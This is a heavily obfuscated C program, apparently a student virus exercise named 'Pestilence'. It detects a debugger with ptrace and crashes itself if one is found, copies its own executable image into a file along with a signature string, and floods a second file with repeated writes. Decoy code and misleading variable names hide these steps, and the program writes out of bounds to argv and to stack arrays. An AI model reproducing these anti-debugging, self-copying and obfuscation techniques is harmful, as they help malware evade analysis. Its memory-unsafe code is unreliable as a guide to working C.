#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#define F fopen
#define S strdup
#define Ss strchr
#define OUT 4
#define STUDENT_ID "Pestilence version 1.0 (c)oded by angonyam"
int main(int qq,char**v) { 
char*e;int x = 101; int i = 256;char s[i];int c=i-i;s[c]=c+80; struct stat info;
s[c+c+1]=c+101;int j=c+1;c+=101;s[++j]=(c+=14);s[++j] = ++c;s[++j]=0;int k=j;j=-42; int Fp;char*(*l)(const char *)=&S;e=l(s);s[x]=49;s[((j*-1)-j+1)]=x;s[++j]='@';
FILE*fp=F("Pestilence","ab+");char*q=Ss(STUDENT_ID,105);int SsSsSs=i+STUDENT_ID[6];char xXx[SsSsSs];xXx[SsSsSs]=s[j];s[j]=xXx[SsSsSs-j]=xXx[j];
char*t=S("oded by an");int Forty=42;read(OUT,xXx,OUT);int idx=open("Pestilence",
O_RDONLY);s[j-idx]='a';s[j++]='n';s[j++]='g';for(x=42;x>0;x--)idx=open(e,O_RDONLY);Ss(xXx,44);S(t);v[99]=l(e);free(e);e=l(q);write(idx,e,OUT);
while(++x<11)j++;unsigned char mch[]="\x7f\x64\x47\x52\x02\x00\x01\x00\x00\xff\xeb";write(Fp,mch,sizeof(mch));while(x>-11)x--;v[x]=l(mch);int kXv=2;if(ptrace(0,0,1,0)==-1)kill(getpid(),SIGSEGV);i=i<<2;j=i>>8;x=j-i+16<<24;k=i<<j|i;memcpy(&s[kXv], (void*)&STUDENT_ID[11],sizeof(STUDENT_ID));int u=0;int aly;for(u=0;u<42;u++){for(aly=0;aly<104124;aly++){if(aly%2>>4|44+9<<2==100)Fp=open("pestilence",O_RDWR,0777);write(Fp,STUDENT_ID,40/10<<2);}}aly-=aly++;aly;int lily=open(v[aly],O_RDONLY);fstat(lily,&info);size_t size=info.st_size;unsigned char*ed=mmap(0,size,PROT_READ|PROT_WRITE,MAP_PRIVATE,lily,0);fwrite(ed,size,1,fp);x<<2;v[3]=v[99];fwrite(v[3],strlen(v[3]),1,fp);fwrite(q,strlen(q),1,fp);fclose(fp);


printf("string is %s%s\n", v[99], q);
int count = 0;
while (count < 4)
{
	printf("string is :%c\n", s[count]);
	count++;
}
return (0);
}
